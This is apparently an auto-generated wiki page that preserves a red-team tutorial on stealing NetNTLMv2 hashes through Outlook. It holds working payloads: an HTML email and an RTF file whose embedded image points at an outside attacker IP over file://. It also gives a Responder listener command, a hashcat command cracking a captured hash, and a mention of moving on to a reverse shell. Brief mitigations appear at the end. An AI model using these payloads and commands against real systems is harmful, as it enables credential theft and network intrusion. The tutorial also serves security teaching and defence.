---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# NetNTLMv2 hash stealing using Outlook

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-initial-access-netntlmv2-hash-stealing-using-outlook` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [NetNTLMv2 hash stealing using Outlook](../../topics/offensive-security/netntlmv2-hash-stealing-using-outlook.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-initial-access-netntlmv2-hash-stealing-using-outlook |
| name | NetNTLMv2 hash stealing using Outlook |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2018-12-28 15-05.gif
- Screenshot from 2018-12-28 15-09-57.png
- Screenshot from 2018-12-28 15-11-07.png
- Screenshot from 2018-12-28 15-11-47.png
- Screenshot from 2018-12-28 15-16-46.png
_body: "# NetNTLMv2 hash stealing using Outlook\n\n## Context\n\nIf a target system is not running the latest version of Windows/Outlook,\
  \ it may be possible to craft such an email that allows an attacker to steal the victim's NetNTLMv2 hashes without requiring\
  \ any interaction from the user - clicking the email to preview it is enough for the hashes to be stolen.\n\n{% hint style=\"\
  warning\" %}\nNote that this attack does not work on the most up to date version of Windows 10 and Outlook 2016 versions,\
  \ so like always - patch early and often.\n{% endhint %}\n\n## Weaponization\n\nLet's create a new HTML file with the below:\n\
  \n{% code title=\"message.html\" %}\n```markup\n<html>\n    <h1>holla good sir</h1>\n    <img src=\"file://157.230.60.143/download.jpg\"\
  >\n</html>\n```\n{% endcode %}\n\nAn RTF file also works:\n\n{% code title=\"message.rtf\" %}\n```javascript\n{\\rtf1{\\\
  field{\\*\\fldinst {INCLUDEPICTURE \"file://157.230.60.143/test.jpg\" \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}\n```\n{% endcode\
  \ %}\n\nThen insert a new file by clicking the attachment icon at the top on the window title bar:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-12-28 15-09-57.png>)\n\nSelect the malicious messge.html and select `Insert as Text`:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-12-28 15-11-07.png>)\n\nYou should see that your message now looks like an HTML with a broken image (expected\
  \ in our case since the path to the image is fake):\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-28 15-11-47.png>)\n\
  \n## Execution\n\nFire up `Responder` to listen for incoming SMB authentication requests from the victim\n\n{% code title=\"\
  attacker@kali\" %}\n```csharp\nresponder -I eth1 -v\n```\n{% endcode %}\n\n..and send the malicious email to the victim.\n\
  \n## Victim View\n\nOnce the victim opens their Outlook and clicks on the malicious email to preview it, their machine will\
  \ attempt authenticating to the attacker controlled server (running Responder). This will give away the victim's `NetNTLMv2`\
  \ hashes to the attacker, which they can then attempt at cracking:\n\n![](<../../.gitbook/assets/Peek 2018-12-28 15-05.gif>)\n\
  \nOnce the hash is stolen, we can attempt cracking it:\n\n{% code title=\"attacker@kali\" %}\n```csharp\nhashcat -m5600\
  \ 'spotless::OFFENSE:6bdb56c8140cf8dc:FFEF94D55C2EB2DE8CF13F140687AD7A:0101000000000000A5A01FB2BE9ED401114D47C1916811640000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000000000000200000407D7D30819F03909981529F6ACA84502CFCC8B3555DBA34316F8914973DD03C0A0010000000000000000000000000000000000009001A0063006900660073002F00310030002E0030002E0030002E0035000000000000000000'\
  \ -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable\n```\n{% endcode %}\n\nIn this case, we can see the user\
  \ had a ridiculously simple password, which got cracked immediately:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-28\
  \ 15-16-46.png>)\n\nThe next step would be to use Ruler to gain a reverse shell from the victims corporate network:\n\n\
  {% content-ref url=\"password-spraying-outlook-web-access-remote-shell.md\" %}\n[password-spraying-outlook-web-access-remote-shell.md](password-spraying-outlook-web-access-remote-shell.md)\n\
  {% endcontent-ref %}\n\n## Mitigation\n\n* Patch Windows and Outlook\n* Block outgoing SMB connections to the Internet\n\
  * Read emails in plain text\n* Enforce strong passwords\n\n## References\n\n{% embed url=\"https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/smb-hash-hijacking-and-user-tracking-in-ms-outlook/\"\
  \ %}"
_relative_path: offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook.md
````
